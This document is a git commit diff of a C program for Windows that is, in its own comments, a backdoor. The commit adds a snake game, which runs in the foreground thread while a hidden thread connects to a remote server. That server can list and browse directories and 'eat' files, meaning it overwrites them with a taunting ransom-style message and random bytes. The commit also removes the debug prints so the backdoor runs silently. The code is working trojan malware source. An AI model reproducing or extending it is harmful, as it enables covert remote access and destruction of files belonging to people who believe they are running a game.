deecd7c416aad5e7bfed1b4e0414cbc18c4e6578
Sarim Ahmed <C41f0N@protonmail.com>
2023-11-25 15:57:20 +0500

    Added snake game to client.c

--- client_winsock.c
+++ client_winsock.c
@@ -1,13 +1,18 @@
-#include<stdio.h>
-#include<winsock2.h>
-#include<string.h>
+#include <stdio.h>
+#include <winsock2.h>
+#include <string.h>
 #include <dirent.h>
 #include <stdlib.h>
 #include <time.h>
 #include <pthread.h>
+#define GAMESCREEN_WIDTH 50
+#define GAMESCREEN_HEIGHT 10
 
-#pragma comment(lib,"ws2_32.lib")
+#pragma comment(lib, "ws2_32.lib")
 
+// ==================================================================================
+// 				   CODE FOR CONNECTIONS AND BACK DOOR STARTS HERE
+// ==================================================================================
 
 // Declaring needed variables globally
 WSADATA wsa;
@@ -20,38 +25,39 @@ int awaamiErrorCode;
 // Repetitive code declared as functions here...
 
 // Called when any error is caught, to stop the program then and there
-void error() {
+void error()
+{
 	exit(1);
 }
 
 // Iniitialize Winsock
-void initWinSock() {
-	if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
+void initWinSock()
+{
+	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
 	{
-		fprintf(stderr, "\nFailed. Error Code : %d",WSAGetLastError());
 		error();
 	}
-	
 }
 
 // Create socket
-void createPrepSock() {
+void createPrepSock()
+{
 
-	if((s = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)
+	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
 	{
-		fprintf(stderr, "\nCould not create socket : %d" , WSAGetLastError());
 		error();
 	}
 }
 
 // Connect to the hacker/server's computer
-int makeConnToServer() {
+int makeConnToServer()
+{
 
 	server.sin_addr.s_addr = inet_addr("127.0.0.1");
 	server.sin_family = AF_INET;
 	server.sin_port = htons(8888);
-	
-	if (connect(s , (struct sockaddr *)&server , sizeof(server)) < 0)
+
+	if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
 	{
 		return 0;
 	}
@@ -60,99 +66,109 @@ int makeConnToServer() {
 }
 
 // Recieve data and put it in buffer
-int reliableRecieve() {
+int reliableRecieve()
+{
 
 	// Cleaning buffer before data comes.
-	memset(buffer,0,strlen(buffer));
+	memset(buffer, 0, strlen(buffer));
 
-	if ((recv_size = recv(s, buffer, sizeof(buffer), 0)) == SOCKET_ERROR) {
+	if ((recv_size = recv(s, buffer, sizeof(buffer), 0)) == SOCKET_ERROR)
+	{
 		return -1;
 	}
 
 	buffer[recv_size] = '\0';
-	if (recv_size == 1) return 0;
+	if (recv_size == 1)
+		return 0;
 
 	return 1;
 }
 
 // Send all data stored in buffer
-void reliableSend() {
-	//Sending message to client
-	send(s , buffer , strlen(buffer) , 0);
+void reliableSend()
+{
+	// Sending message to client
+	send(s, buffer, strlen(buffer), 0);
 }
 
 // Load the buffer with list of current folder contents
 void pullDirectoryData()
-    {
-        // Code to extract directory data
-        DIR *directory;
-        struct dirent *entry;
+{
+	// Code to extract directory data
+	DIR *directory;
+	struct dirent *entry;
 
-        // Open the current working directory
-        directory = opendir(".");
-        if (directory == NULL)
-        {
-            perror("Error opening current working directory");
-        }
+	// Open the current working directory
+	directory = opendir(".");
+	if (directory == NULL)
+	{
+		perror("Error opening current working directory");
+	}
 
-        // Loop through the entries in the directory
-        while ((entry = readdir(directory)) != NULL)
-        {
-            char filename[100];
-            char filetype[10];
+	// Loop through the entries in the directory
+	while ((entry = readdir(directory)) != NULL)
+	{
+		char filename[100];
+		char filetype[10];
 
-            if((entry->d_type + '0') == '0') {
-                strcpy(filetype, "FILE");
-            } else {
-                strcpy(filetype, "FOLDER");
-            }
+		if ((entry->d_type + '0') == '0')
+		{
+			strcpy(filetype, "FILE");
+		}
+		else
+		{
+			strcpy(filetype, "FOLDER");
+		}
 
-            strcpy(filename, entry->d_name);
-            strcat(filename, "\n");
-            strcat(filename, filetype);
-            strcat(filename, "\n\n");
-            strcat(buffer, filename);
-        }
+		strcpy(filename, entry->d_name);
+		strcat(filename, "\n");
+		strcat(filename, filetype);
+		strcat(filename, "\n\n");
+		strcat(buffer, filename);
+	}
 
-        // Close the directory
-        closedir(directory);
+	// Close the directory
+	closedir(directory);
 }
 
 // Load the buffer with CWD Path
-void loadCWD() {
+void loadCWD()
+{
 	getcwd(buffer, sizeof(buffer));
 }
 
 // Load the buffer with any data
-void writeToBuffer(char data[]) {
+void writeToBuffer(char data[])
+{
 	// Clearing old data
-	memset(buffer,0,strlen(buffer));
+	memset(buffer, 0, strlen(buffer));
 
 	// Putting new data
 	strcpy(buffer, data);
 }
 
 // Function that eats any file
-int eatFile(char fileName[]) {
-    int offset, n;
-    FILE *filein;
+int eatFile(char fileName[])
+{
+	int offset, n;
+	FILE *filein;
 
-    srand(time(NULL));
+	srand(time(NULL));
 
-    filein = fopen(fileName, "r");
+	filein = fopen(fileName, "r");
 
-    if (filein == NULL) {
-        return 0;
-    }
+	if (filein == NULL)
+	{
+		return 0;
+	}
 
-    fseek(filein, 0L, SEEK_END);
-    n = ftell(filein);
+	fseek(filein, 0L, SEEK_END);
+	n = ftell(filein);
 
-    fclose(filein);
+	fclose(filein);
 
-    filein = fopen(fileName, "w");
+	filein = fopen(fileName, "w");
 
-	
 	fputs("         _______________\n", filein);
 	fputs("        /               \\\n", filein);
 	fputs("       /                 \\\n", filein);
@@ -179,48 +195,50 @@ int eatFile(char fileName[]) {
 	fputs("XXXXX                        XXXXX\n", filein);
 	fputs("  XXX                        XXX\n\n", filein);
 
-
 	fputs("=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/\n", filein);
 	fputs("			I OWN YOUR FILE.\n			WATCH THE VIDEO TO GET IT BACK.\n", filein);
 	fputs("=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/\n\n", filein);
 	fputs("https://www.youtube.com/watch?v=dQw4w9WgXcQ\n\n", filein);
 
-    for (int i = 0; i < n; i++) {
-        fputc(rand() % 256, filein);
-    }
+	for (int i = 0; i < n; i++)
+	{
+		fputc(rand() % 256, filein);
+	}
 
-    fclose(filein);
+	fclose(filein);
 
-    return 1;
+	return 1;
 }
 
 // Main function for backdoor operations
 int backdoor_main()
 {
-	// Main Code 
+	// Main Code
 
 	initWinSock();
 
 	// A continious connection persistant loop for the backdoor
 	int connected = 0;
 
-	while (1) {
+	while (1)
+	{
 
-		while (!connected) {
+		while (!connected)
+		{
 			Sleep(1000);
-			fprintf(stderr, "\r[+] Trying to connect...");
 			createPrepSock();
 			connected = makeConnToServer(); // returns 1 if successful
 		}
 
-		fprintf(stderr, "\n\n[+] Connected\n");
-		
-		while (connected) {
-			
+		while (connected)
+		{
+
 			// Getting chosen option by server
-			while (1) {
+			while (1)
+			{
 				awaamiErrorCode = reliableRecieve();
-				if (awaamiErrorCode != 0) break;
+				if (awaamiErrorCode != 0)
+					break;
 			}
 
 			// Checking if connection is still intact.
@@ -229,112 +247,341 @@ int backdoor_main()
 				// Checking option selected by server
 				int option = atoi(buffer);
 
-				switch (option) {
-					case 1:
-						fprintf(stderr, "\n[+] Pulling file list data...");
-						pullDirectoryData();
+				switch (option)
+				{
+				case 1:
+					pullDirectoryData();
 
-						fprintf(stderr, "\n[+] Sending file list data.");
-						reliableSend();
+					reliableSend();
 
-						break;
+					break;
 
-					
-					case 2:
-						fprintf(stderr, "\n[+] Getting cwd...");
-						loadCWD();
+				case 2:
+					loadCWD();
 
-						fprintf(stderr, "\n[+] Sending data.");
-						reliableSend();
+					reliableSend();
 
-						break;
+					break;
 
+				case 3:
 
-					case 3:
-						fprintf(stderr, "\n[+] Getting directory name from server...");
-						
-						awaamiErrorCode = 0;
-						while (awaamiErrorCode == 0) {
-							awaamiErrorCode = reliableRecieve();
-						}
+					awaamiErrorCode = 0;
+					while (awaamiErrorCode == 0)
+					{
+						awaamiErrorCode = reliableRecieve();
+					}
 
-						chdir(buffer);
+					chdir(buffer);
 
-						// Sending updated CWD
-						loadCWD();
-						fprintf(stderr, "\n[+] Sending updated CWD.");
-						reliableSend();
+					// Sending updated CWD
+					loadCWD();
+					reliableSend();
 
-						break;
+					break;
 
+				case 4:
+					chdir("..");
 
-					case 4:
-						fprintf(stderr, "\n[+] Changing to parent directory...");
-						chdir("..");
+					// Sending updated CWD
+					loadCWD();
+					reliableSend();
 
-						// Sending updated CWD
-						loadCWD();
-						fprintf(stderr, "\n[+] Sending updated CWD.");
-						reliableSend();
+					break;
 
-						break;
+				case 5:
 
-					case 5:
-						fprintf(stderr, "\n[+] Getting file name from server...");
-						
-						awaamiErrorCode = 0;
-						while (awaamiErrorCode == 0) {
-							awaamiErrorCode = reliableRecieve();
-						}
+					awaamiErrorCode = 0;
+					while (awaamiErrorCode == 0)
+					{
+						awaamiErrorCode = reliableRecieve();
+					}
 
-						awaamiErrorCode = eatFile(buffer);
+					awaamiErrorCode = eatFile(buffer);
 
-						// Sending post eating report
-						fprintf(stderr, "\n[+] Sending post eating report.");
-						if (awaamiErrorCode == 1) {
-							writeToBuffer("File eaten successfully.");
-						} else {
-							writeToBuffer("File was not eaten, probably not found.");
-						}
+					// Sending post eating report
+					if (awaamiErrorCode == 1)
+					{
+						writeToBuffer("File eaten successfully.");
+					}
+					else
+					{
+						writeToBuffer("File was not eaten, probably not found.");
+					}
 
-						reliableSend();
+					reliableSend();
 
-						break;
-					
-					default:
-						printf("\n[+] Invalid Option Recieved.");
-						break;
+					break;
+
+				default:
+					break;
 				}
 			}
 
 			// if connection was broken
-			else {
+			else
+			{
 				connected = 0;
 				break;
 			}
 		}
-		
-		fprintf(stderr, "\n\n[+] Disconnected...\n\n");
 	}
 
 	return 0;
 }
 
+// ==================================================================================
+// 				   CODE FOR CONNECTIONS AND BACK DOOR ENDS HERE
+// ==================================================================================
+
+// ==================================================================================
+// 				   		CODE FOR THE SNAKE GAME STARTS HERE
+// ==================================================================================
+
+struct SnakeGame
+{
+	int vel_x;
+	int vel_y;
+	int food_x;
+	int food_y;
+	int score;
+	int running;
+
+	int length;
+	int top;
+	int snakeBody[GAMESCREEN_WIDTH * GAMESCREEN_HEIGHT][2];
+};
+
+int temp;
+struct SnakeGame snakeGame;
+
+char inputCh;
+char snakeChar = '0';
+char backgroundChar = ' ';
+char borderChar = 'X';
+char foodChar = 'a';
+
+void putFood()
+{
+	snakeGame.food_x = (rand() % (GAMESCREEN_WIDTH - 2)) + 1;
+	snakeGame.food_y = (rand() % (GAMESCREEN_HEIGHT - 2)) + 1;
+}
+
+void initialize()
+{
+	// Initialize all values of the array
+	for (int i = 0; i < (GAMESCREEN_HEIGHT * GAMESCREEN_WIDTH); i++)
+	{
+		snakeGame.snakeBody[i][0] = -1;
+		snakeGame.snakeBody[i][1] = -1;
+	}
+
+	snakeGame.score = 0;
+
+	snakeGame.snakeBody[0][0] = (int)GAMESCREEN_WIDTH / 2;
+	snakeGame.snakeBody[0][1] = (int)GAMESCREEN_HEIGHT / 2;
+
+	snakeGame.snakeBody[0][0] = (int)(GAMESCREEN_WIDTH / 2) - 1;
+	snakeGame.snakeBody[0][1] = (int)GAMESCREEN_HEIGHT / 2;
+
+	snakeGame.snakeBody[0][0] = (int)(GAMESCREEN_WIDTH / 2) - 2;
+	snakeGame.snakeBody[0][1] = (int)GAMESCREEN_HEIGHT / 2;
+
+	snakeGame.length = 3;
+
+	putFood();
+
+	snakeGame.vel_x = 1;
+	snakeGame.vel_y = 0;
+}
+
+int checkGameOver()
+{
+	if ((snakeGame.snakeBody[0][0] + snakeGame.vel_x) < (GAMESCREEN_WIDTH - 1) &&
+		(snakeGame.snakeBody[0][0] + snakeGame.vel_x) > 0 &&
+		(snakeGame.snakeBody[0][1] + snakeGame.vel_y) < (GAMESCREEN_HEIGHT - 1) &&
+		(snakeGame.snakeBody[0][1] + snakeGame.vel_y) > 0)
+	{
+		return 0;
+	}
+	else
+	{
+		return 1;
+	}
+}
+
+void gameOver()
+{
+	snakeGame.running = 0;
+}
+
+int snakeIsHere(int x, int y)
+{
+	for (int i = 0; i < (GAMESCREEN_WIDTH * GAMESCREEN_HEIGHT); i++)
+	{
+		// check x and y
+		if (x == snakeGame.snakeBody[i][0] && y == snakeGame.snakeBody[i][1])
+		{
+			return 1;
+		}
+	}
+	return 0;
+}
+
+int hasEatenFood()
+{
+	if (snakeIsHere(snakeGame.food_x, snakeGame.food_y))
+	{
+		return 1;
+	}
+	else
+	{
+		return 0;
+	}
+}
+
+void update()
+{
+	if (checkGameOver())
+	{
+		gameOver();
+	}
+
+	if (hasEatenFood())
+	{
+		snakeGame.length++;
+		snakeGame.score++;
+		putFood();
+	}
+
+	// Shift all places to right
+	for (int i = (GAMESCREEN_HEIGHT * GAMESCREEN_WIDTH) - 1; i >= 0; i--)
+	{
+		snakeGame.snakeBody[i + 1][0] = snakeGame.snakeBody[i][0];
+		snakeGame.snakeBody[i + 1][1] = snakeGame.snakeBody[i][1];
+	}
+
+	snakeGame.snakeBody[0][0] += snakeGame.vel_x;
+	snakeGame.snakeBody[0][1] += snakeGame.vel_y;
+
+	snakeGame.top++;
+
+	// Do a cleanup
+	while (snakeGame.top + 1 > snakeGame.length)
+	{
+		snakeGame.snakeBody[snakeGame.top][0] = -1;
+		snakeGame.snakeBody[snakeGame.top][1] = -1;
+		snakeGame.top--;
+	}
+}
+
+void render()
+{
+	for (int j = 0; j < GAMESCREEN_HEIGHT; j++)
+	{
+		for (int i = 0; i < GAMESCREEN_WIDTH; i++)
+		{
+			if (snakeIsHere(i, j))
+			{
+				printf("%c", snakeChar);
+			}
+			else if (i == 0 || i == GAMESCREEN_WIDTH - 1 || j == 0 || j == GAMESCREEN_HEIGHT - 1)
+			{
+				printf("%c", borderChar);
+			}
+			else if (i == snakeGame.food_x && j == snakeGame.food_y)
+			{
+				printf("%c", foodChar);
+			}
+			else
+			{
+				printf("%c", backgroundChar);
+			}
+		}
+		printf("\n");
+	}
+	printf("SCORE: %d", snakeGame.score);
+}
+
+void updateVelocity()
+{
+	if (_kbhit())
+	{
+		inputCh = getch();
+		if ((inputCh == 'w' || inputCh == 'W') && snakeGame.vel_y != 1)
+		{
+			snakeGame.vel_x = 0;
+			snakeGame.vel_y = -1;
+		}
+		else if ((inputCh == 'a' || inputCh == 'A') && snakeGame.vel_x != 1)
+		{
+			snakeGame.vel_x = -1;
+			snakeGame.vel_y = 0;
+		}
+		else if ((inputCh == 's' || inputCh == 'S') && snakeGame.vel_y != -1)
+		{
+			snakeGame.vel_x = 0;
+			snakeGame.vel_y = 1;
+		}
+		else if ((inputCh == 'd' || inputCh == 'D') && snakeGame.vel_x != -1)
+		{
+			snakeGame.vel_x = 1;
+			snakeGame.vel_y = 0;
+		}
+	}
+}
+
+int snakeGameMain()
+{
+	snakeGame.running = 1;
+
+	while (1)
+	{
+		// SnakeGame Starts
+		system("cls");
+		initialize();
+
+		// SnakeGame Runs
+		while (snakeGame.running)
+		{
+			update();
+			render();
+			Sleep(250);
+			updateVelocity();
+			fflush(stdin);
+			system("cls");
+		}
+
+		// SnakeGame Over
+		printf("\nGAME OVER.");
+		printf("\nPress any key to try again.");
+		getch();
+		snakeGame.running = 1;
+		fflush(stdin);
+	}
+}
+
+// ==================================================================================
+// 				   		CODE FOR THE SNAKE GAME ENDS HERE
+// ==================================================================================
+
+// ==================================================================================
+// 				   		  MULTITHREADING WORK STARTS HERE
+// ==================================================================================
 
 // Runs the main code for the backdoor operations.
-void *thread1() {
+void *thread1()
+{
 	backdoor_main();
 }
 
 // Runs the minigame in the foreground
-void *thread2() {
-	// while(1) {
-	// 	fprintf(stderr, "Hello Jee, I'm also here!\n");
-	// 	Sleep(1000);
-	// }
+void *thread2()
+{
+	snakeGameMain();
 }
 
-int main(int argc , char *argv[]) {
+int main(int argc, char *argv[])
+{
 
 	// The main function here executes two different functions in parallel,
 	// namely thread1 and thread2.
